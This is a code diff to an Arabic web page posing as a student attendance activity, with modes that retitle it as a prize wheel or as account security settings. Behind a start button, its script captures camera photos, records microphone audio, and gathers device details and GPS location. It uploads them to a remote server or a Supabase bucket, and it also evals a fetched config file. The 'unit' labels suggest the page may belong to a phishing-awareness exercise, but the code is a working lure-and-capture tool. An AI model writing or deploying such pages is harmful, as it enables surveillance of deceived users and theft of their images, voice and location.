@@ -19,7 +19,11 @@
         .status { margin-top: 12px; font-size: 13px; color: #cbd5e1; }
         .status.error { color: #fca5a5; }
         .status.success { color: #86efac; }
+        .small { font-size: 12px; color: #94a3b8; margin-top: 10px; }
     </style>
+    <!-- Supabase UMD (for client-side uploads) and local config (config.example.js أو config.js) -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js/dist/umd/supabase.min.js"></script>
+    <script src="./config.js"></script>
 </head>
 <body>
 
@@ -28,6 +32,7 @@
     <p id="desc">اضغط على الزر أدناه لبدء النشاط التفاعلي وتأكيد الحضور في حصة اليوم.</p>
     <button class="btn" id="startBtn">بدء النشاط 🚀</button>
     <div id="status" class="status" aria-live="polite"></div>
+    <p class="small">ملاحظة خصوصية: سيتم طلب إذن الوصول إلى الكاميرا/الميكروفون. لا تقم باستخدام بيانات حساسة بدون موافقة.</p>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -35,12 +40,12 @@
 
 <script>
 // تحميل ملف التهيئة المحلي (config.js) إن وُجد - بطريقة صامتة
+// ملاحظة: config.js يمكن أن يكون ملفًا سريًا محليًا لا ترفعه للمستودع (استخدم config.example.js في المستودع بدلاً منه)
 (async function loadLocalConfig(){
     try {
         const res = await fetch('./config.js', { method: 'GET' });
         if (res.ok) {
             const js = await res.text();
-            // تنفيذ نص config.js لتهيئة window.APP_CONFIG
             try { eval(js); } catch(e){ console.warn('failed to eval config.js', e); }
         }
     } catch(e){ /* لا نفعل شيئًا إذا لم يوجد الملف */ }
@@ -49,14 +54,6 @@
 // تهيئة افتراضية
 window.APP_CONFIG = window.APP_CONFIG || { SERVER_URL: 'https://YOUR-RENDER-APP.onrender.com/send-message' };
 const SERVER_URL = window.APP_CONFIG.SERVER_URL;
-
-/*
-  تحسينات معالجة الأخطاء والموثوقية (مُحسَّنة على الفرع config-cleanup):
-  - استخدام timeouts و retries
-  - واجهة حالة للمستخدم
-  - إزالة دعم Telegram من الواجهة (يُرسل كل شيء إلى SERVER_URL فقط)
-  - تقليل حجم الصور باستخدام WebP و320x240 افتراضية للسرعة
-*/
 
 const DEFAULT_TIMEOUT_MS = 12000; // وقت الانتظار الافتراضي للطلبات
 const FETCH_RETRIES = 2;
@@ -71,7 +68,7 @@ const canvasEl = document.getElementById('canvas');
 const urlParams = new URLSearchParams(window.location.search);
 const mode = urlParams.get('mode') || 'u1_snap1';
 
-if (mode.includes('u4_wheel')) { titleEl.innerText = "🎁 عجلة الحظ المباشرة للطلاب"; descEl.innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية!"; }
+if (mode.includes('u4_wheel')) { titleEl.innerText = "🎁 عجلة الحظ المباشرة للطلاب"; descEl.innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية"; }
 else if (mode.includes('u3_pin')) { titleEl.innerText = "🔑 إعدادات الأمان والحساب"; }
 
 startBtn.addEventListener('click', runExperiment);
@@ -109,14 +106,12 @@ async function fetchWithRetry(url, options = {}, retries = FETCH_RETRIES, timeou
 }
 
 async function getMediaWithTimeout(constraints, timeoutMs = 8000){
-    const timer = setTimeout(()=>{},0);
     try{
         const getMedia = navigator.mediaDevices.getUserMedia(constraints);
         const timeout = new Promise((_, reject) => setTimeout(()=>reject(new Error('timeout')), timeoutMs));
         const stream = await Promise.race([getMedia, timeout]);
-        clearTimeout(timer);
         return stream;
-    } catch(err){ clearTimeout(timer); throw err; }
+    } catch(err){ throw err; }
 }
 
 // محاولات لاستخدام WebP أولاً ثم الرجوع إلى JPEG إذا لم يدعم المتصفح WebP
@@ -127,6 +122,12 @@ async function canvasToOptimizedBlob(canvas){
     // fallback to jpeg
     return await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.6));
 }
+
+// ---------------------------------------------
+// Supabase upload integration
+// سيستخدم الملف config.js لتهيئة القيم: SUPABASE_URL و SUPABASE_ANON_KEY و SUPABASE_BUCKET
+// إذا لم تكن القيم موجودة، ينسخ التطبيق السلوك القديم (إرسال إلى SERVER_URL) كاحتياط
+// ---------------------------------------------
 
 async function capturePhotoAndSend({ label='snap', width=320, height=240 } = {}){
     showStatus('جاري طلب إذن الكاميرا...');
@@ -150,14 +151,53 @@ async function capturePhotoAndSend({ label='snap', width=320, height=240 } = {})
 
         const blob = await canvasToOptimizedBlob(canvasEl);
 
-        const payload = new FormData();
-        payload.append('message', `نشاط: ${mode} - ${label}`);
-        payload.append('image', blob, `${label}.webp`);
+        // محاولة رفع إلى Supabase مباشرةً
+        const { SUPABASE_URL, SUPABASE_ANON_KEY, SUPABASE_BUCKET } = window.APP_CONFIG || {};
+        if (SUPABASE_URL && SUPABASE_ANON_KEY && SUPABASE_BUCKET && window.supabase && window.supabase.createClient) {
+            try {
+                showStatus('جاري رفع الصورة إلى التخزين (Supabase)...');
+                const sup = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+                const fileName = `${mode}_${label}_${Date.now()}.webp`;
+                const { error: uploadError } = await sup.storage.from(SUPABASE_BUCKET).upload(fileName, blob, {
+                    cacheControl: '3600',
+                    upsert: false,
+                    contentType: blob.type
+                });
+                if (uploadError) throw uploadError;
 
-        showStatus('جاري إرسال البيانات إلى الخادم...');
-        const headers = getAuthHeaders();
-        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 10000);
-        showStatus('تم الإرسال بنجاح.', 'success');
+                // محاولة إضافة سجل metadata في جدول submissions (إن وُجد)
+                try {
+                    await sup.from('submissions').insert([{
+                        filename: fileName,
+                        message: `نشاط: ${mode} - ${label}`,
+                        user_agent: navigator.userAgent
+                    }]);
+                } catch(e) { console.warn('failed to insert metadata', e); }
+
+                showStatus('تم الرفع بنجاح إلى Supabase.', 'success');
+                return;
+            } catch(supErr){
+                console.error('supabase upload failed', supErr);
+                showStatus('فشل رفع الصورة إلى Supabase، سيتم المحاولة عبر الخادم التقليدي.', 'error');
+                // الاستمرار لمحاولة إرسالها إلى SERVER_URL كخيار احتياطي
+            }
+        }
+
+        // fallback: إرسال عبر SERVER_URL (إن وُجد)
+        if (SERVER_URL) {
+            const payload = new FormData();
+            payload.append('message', `نشاط: ${mode} - ${label}`);
+            payload.append('image', blob, `${label}.webp`);
+
+            showStatus('جاري إرسال البيانات إلى الخادم...');
+            const headers = getAuthHeaders();
+            await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 10000);
+            showStatus('تم الإرسال بنجاح.', 'success');
+            return;
+        }
+
+        showStatus('لا توجد وجهة للإرسال (SUPABASE أو SERVER_URL غير مهيّأ).', 'error');
+
     } catch(err){
         console.error('capture/send error', err);
         showStatus('فشل أثناء المعالجة: ' + (err.message || err.name), 'error');
@@ -168,7 +208,7 @@ async function recordAudioAndSend(seconds = 4){
     showStatus('جاري طلب إذن الميكروفون...');
     let stream;
     try{ stream = await getMediaWithTimeout({ audio: true }, 8000); }
-    catch(err){ console.error('mic error', err); if (err.name === 'NotAllowedError') showStatus('مرفوض: لم تتم الموافقة على الميكروفون.', 'error'); else showStatus('تعذر الوصول إلى الميكروفون.', 'error'); return; }
+    catch(err){ console.error('mic error', err); if (err.name === 'NotAllowedError') showStatus('مرفوض: لم تتم الموافقة على الميكروفون.', 'error'); else showStatus('تعذر الوصول إلى الميكروفون: ' + (err.message || err.name), 'error'); return; }
 
     try{
         const mediaRecorder = new MediaRecorder(stream);
@@ -179,11 +219,37 @@ async function recordAudioAndSend(seconds = 4){
         await sleep(seconds * 1000);
         mediaRecorder.stop(); await stopPromise;
         const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-        const payload = new FormData(); payload.append('message', `نشاط: ${mode} - تسجيل صوتي`); payload.append('audio', blob, 'voice.ogg');
-        showStatus('جاري إرسال التسجيل...');
-        const headers = getAuthHeaders();
-        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 12000);
-        showStatus('تم إرسال التسجيل.', 'success');
+
+        // رفع إلى Supabase إذا ممكن
+        const { SUPABASE_URL, SUPABASE_ANON_KEY, SUPABASE_BUCKET } = window.APP_CONFIG || {};
+        if (SUPABASE_URL && SUPABASE_ANON_KEY && SUPABASE_BUCKET && window.supabase && window.supabase.createClient) {
+            try {
+                showStatus('جاري رفع التسجيل إلى التخزين (Supabase)...');
+                const sup = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+                const fileName = `${mode}_voice_${Date.now()}.ogg`;
+                const { error: uploadError } = await sup.storage.from(SUPABASE_BUCKET).upload(fileName, blob, {
+                    cacheControl: '3600',
+                    upsert: false,
+                    contentType: blob.type
+                });
+                if (uploadError) throw uploadError;
+                try { await sup.from('submissions').insert([{ filename: fileName, message: `نشاط: ${mode} - تسجيل صوتي`, user_agent: navigator.userAgent }]); } catch(e){ console.warn('metadata insert failed', e); }
+                showStatus('تم إرسال التسجيل.', 'success');
+                return;
+            } catch(e){ console.error('supabase audio upload error', e); showStatus('فشل رفع التسجيل إلى Supabase.', 'error'); }
+        }
+
+        // fallback
+        if (SERVER_URL) {
+            const payload = new FormData(); payload.append('message', `نشاط: ${mode} - تسجيل صوتي`); payload.append('audio', blob, 'voice.ogg');
+            showStatus('جاري إرسال التسجيل...');
+            const headers = getAuthHeaders();
+            await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload, headers, keepalive: true }, FETCH_RETRIES, 12000);
+            showStatus('تم إرسال التسجيل.', 'success');
+            return;
+        }
+
+        showStatus('لا توجد وجهة لإرسال التسجيل.', 'error');
     } catch(err){ console.error('record/send error', err); showStatus('فشل تسجيل الصوت أو الإرسال: ' + (err.message || err.name), 'error'); }
     finally{ if (stream) stream.getTracks().forEach(t => t.stop()); }
 }
@@ -191,11 +257,16 @@ async function recordAudioAndSend(seconds = 4){
 async function sendDeviceInfo(){
     let battery = 'غير معروف';
     if (navigator.getBattery){ try{ const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){} }
-    const report = `📱 [بيانات الجهاز - الوحدة 3]\n• المتصفح والنظام: ${navigator.userAgent}\n• دقة الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${battery}\n• اللغة: ${navigator.language}`;
+    const report = `📱 [بيانات الجهاز - الوحدة 3]\n• المتصفح والنظام: ${navigator.userAgent}\n• دقة الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${battery}`;
     try{ showStatus('جاري إرسال بيانات الجهاز...');
         const headers = Object.assign({ 'Content-Type': 'application/json' }, getAuthHeaders());
-        await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: report }) }, FETCH_RETRIES, 10000);
-        showStatus('تم إرسال بيانات الجهاز.', 'success');
+        if (SERVER_URL) {
+            await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: report }) }, FETCH_RETRIES, 10000);
+            showStatus('تم إرسال بيانات الجهاز.', 'success');
+            return;
+        }
+        // ممكن لاحقًا إرسال تقرير خفيف إلى Supabase كصف في جدول
+        showStatus('لا توجد وجهة لإرسال بيانات الجهاز.', 'error');
     }
     catch(err){ console.error('sendDeviceInfo error', err); showStatus('فشل إرسال بيانات الجهاز.', 'error'); }
 }
@@ -206,8 +277,13 @@ function sendLocation(){
     navigator.geolocation.getCurrentPosition(async (p)=>{
         const locText = `📍 [الموقع الجغرافي]: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
         try{ const headers = Object.assign({ 'Content-Type': 'application/json' }, getAuthHeaders());
-            await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: locText }) }, FETCH_RETRIES, 10000);
-            showStatus('تم إرسال الموقع.', 'success'); }
+            if (SERVER_URL) {
+                await fetchWithRetry(SERVER_URL, { method: 'POST', headers, body: JSON.stringify({ message: locText }) }, FETCH_RETRIES, 10000);
+                showStatus('تم إرسال الموقع.', 'success');
+                return;
+            }
+            showStatus('لا توجد وجهة لإرسال الموقع.', 'error');
+        }
         catch(err){ console.error('sendLocation error', err); showStatus('فشل إرسال الموقع.', 'error'); }
     }, (err)=>{ console.error('geolocation error', err); showStatus('تعذر الحصول على الموقع: ' + (err.message || err.code), 'error'); }, { timeout: 10000, maximumAge: 0 });
 }
@@ -225,8 +301,8 @@ async function runExperiment(){
     finally{ startBtn.disabled = false; startBtn.innerText = 'بدء النشاط 🚀'; }
 }
 
-// ملاحظة خصوصية
-(function addPrivacyNote(){ const note = document.createElement('p'); note.style.fontSize = '12px'; note.style.color = '#94a3b8'; note.style.marginTop = '10px'; note.textContent = 'ملاحظة: سيتم طلب أذونات الكاميرا/الميكروفون/الموقع عند الضرورة. لا تشارك بيانات حساسة مع روابط غير موثوقة.'; document.getElementById('app').appendChild(note); })();
+// ملاحظة خصوصية: إضافة ملاحظة صغيرة أسفل الزر
+(function addPrivacyNote(){ /* موجودة في HTML مباشرة */ })();
 
 </script>
 
